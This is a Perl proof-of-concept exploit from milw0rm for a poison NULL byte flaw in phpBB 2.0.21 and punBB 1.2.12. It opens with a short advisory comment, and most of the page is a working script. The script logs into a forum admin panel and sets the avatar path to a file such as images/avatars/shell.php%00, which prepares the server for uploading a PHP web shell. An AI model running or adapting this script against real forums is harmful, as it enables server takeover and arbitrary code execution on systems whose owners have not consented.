<html><head><title>phpBB <= 2.0.21 (Poison NULL Byte) Remote Exploit</title></head><pre>#!/usr/bin/perl -w
# Author: ShAnKaR
# Title: multiple PHP application poison NULL byte vulnerability
# Applications: phpBB 2.0.21, punBB 1.2.12
# Threat Level: Critical
# Original advisory (in Russian): http://www.security.nnov.ru/Odocument221.html
# 
# Poison  NULL  byte vulnerability for perl CGI applications was described
# in  [1].  ShAnKaR  noted, that same vulnerability also affects different
# PHP  applications.  An  example of vulnerable applications are phpBB and
# punBB.
# 
# Vulnerability  can  be  used  to  upload  or  replace arbitrary files on
# server, e.g. PHP scripts, by adding &quot;poison NULL&quot; (%00) to filename.
# 
# In  case  of  phpBB and punBB vulnerability can be exploited by changing
# location  of avatar file and uploading avatar file with PHP code in EXIF
# data.
# 
# A PoC exploit to change Avatar file location for phpBB:
# 
# 

use HTTP::Cookies;
use LWP;
use URI::Escape;
unless(@ARGV){die &quot;USE:\n./phpbb.pl localhost.com/forum/ admin pass images/avatars/shell.php [d(DEBUG)]\n&quot;}
my $ua = LWP::UserAgent-&gt;new(agent=&gt;'Mozilla/4.0 (compatible; Windows 5.1)');
$ua-&gt;cookie_jar( HTTP::Cookies-&gt;new());

$url='http://'.$ARGV[0].'/login.php';
$data=&quot;username=&quot;.$ARGV[1].&quot;&amp;password=&quot;.$ARGV[2].&quot;&amp;login=1&quot;;
my $req = new HTTP::Request 'POST',$url;
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;content($data);
my $res = $ua-&gt;request($req);

$res=$ua-&gt;get('http://'.$ARGV[0].'/login.php');
$content=$res-&gt;content;
$content=~ m/true&amp;amp;sid=([^&quot;]+)&quot;/g;
if($ARGV[4]){
$content=$res-&gt;content;
print $content;
}
$url='http://'.$ARGV[0].'/login.php';
$data=&quot;username=&quot;.$ARGV[1].&quot;&amp;password=&quot;.$ARGV[2].&quot;&amp;login=1&amp;admin=1&quot;;
$req = new HTTP::Request 'POST',$url;
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;content($data);
$res = $ua-&gt;request($req);

$url='http://'.$ARGV[0].'/admin/admin_board.php?sid='.$1;
$data=&quot;submit=submit&amp;allow_avatar_local=1&amp;avatar_path=&quot;.$ARGV[3].&quot;%00&quot;;
$req = new HTTP::Request 'POST',$url;
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;content($data);
$res = $ua-&gt;request($req);
if($ARGV[4]){
$content=$res-&gt;content;
print $content;
}

# milw0rm.com [2006-09-11]</pre></html>